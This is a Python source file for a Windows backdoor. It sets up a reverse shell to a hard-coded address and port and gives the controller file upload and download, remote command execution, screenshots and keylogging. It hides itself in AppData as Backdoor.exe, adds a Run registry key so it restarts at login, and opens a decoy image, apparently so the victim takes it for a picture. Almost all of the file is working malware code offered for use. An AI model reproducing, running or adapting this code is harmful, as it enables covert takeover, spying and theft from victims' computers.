#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
from  mss import mss
import ctypes
import threading
import keylogger


def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data+sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue 

def screenshot():
	with mss() as screenshot:
		screenshot.shot()

def  is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
	except:
		admin = "[!!] User Privileges"
	else:
		admin = "[!!] Admin Privileges"

def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name,"wb") as out_file:
		out_file.write(get_response.content)

def connection():
	while True:
		time.sleep(30)
		try:
			sock.connect(("192.168.2.7",54321))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif  command[:2] =="cd" and len(command)>1:
			try:
				os.chdir(command[3:])
			except:
				continue

		elif command[:8] == "download":
			with open(command[9:],"rb") as f:
				reliable_send(base64.b64encode(f.read()))

		elif command[:6] == "upload":
			with open(command[7:],"wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))

		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+]  Downloaded File from URL!!")
			except:
				reliable_send("[!!] Failed to Download File")
		elif command[:5]== "start":
			try:
				subprocess.Popen(command[6:],shell=True)
				reliable_send("[+] Started")
			except:
				reliable_send("[!!] Failed to Start")

		elif command[:10] == "screenshot":
			try:
				screenshot()
				with open("monitor-1.png","rb") as sc:
					reliable_send(base64.b64encode(sc.read()))
				os.remove("monitor-1.png")
			except:
				reliable_send("[!!]Failed to take ScreenShot")

		elif command[:] == "help":
			help_options = """
				                                        	download path --> Dowload a file from target PC
					upload path   --> Upload a file to target PC
					get url       --> Download a file to target from any websit
					start path    --> Start progrm on target PC
					screenshot    --> Screenshot of target PC
					check 	      --> Check for Admin Privileges
					q             --> Quit the shell
					keylog_start  --> Start the keylogging
					keylog_dump   --> Display the logged keys
					"""
			reliable_send(help_options)
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("[!!] Cant Check")

		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
	
		elif command[:11] == "keylog_dump":
			fn = open(keylogger_path,"r")
			reliable_send(fn.read())

		else :
			try:
				proc = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr =subprocess.PIPE , stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("[!!!] Cant Execute That command...!!")

keylogger_path = os.environ["appdata"]+"\\keylogger.txt" 
location = os.environ["appdata"]+"\\Backdoor.exe"
if not os.path.exists(location):
	shutil.copyfile(sys.executable,location)
	subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "'+location+'"',shell=True)

	name = sys._MEIPASS+"\test.jpeg"
	try:
		subprocess.Popen(name,shell=True)
	except:
		number = 3
		number1 = 5
		add = number+number1


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()

